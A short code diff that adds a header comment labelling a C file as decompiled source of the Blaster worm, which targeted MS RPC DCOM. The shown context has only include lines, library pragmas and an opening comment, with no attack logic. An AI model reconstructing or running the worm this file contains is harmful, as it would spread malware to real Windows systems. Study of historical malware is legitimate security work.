@@ -1,3 +1,8 @@
+/*
+ * DECOMPILED SOURCE FOR MS RPC DCOM BLASTER WORM
+ * <http://robertgraham.com/journal/030815-blaster.c>
+ */ 
+
 #include <winsock2.h>
 #include <ws2tcpip.h> /*IP_HDRINCL*/
 #include <wininet.h> /*InternetGetConnectedState*/
@@ -6,8 +11,7 @@
 #pragma comment (lib, "ws2_32.lib")
 #pragma comment (lib, "wininet.lib")
 #pragma comment (lib, "advapi32.lib")
-
-
+ 
 /*
  * These strings aren't used in the worm, Buford put them here
  * so that whitehat researchers would discover them.
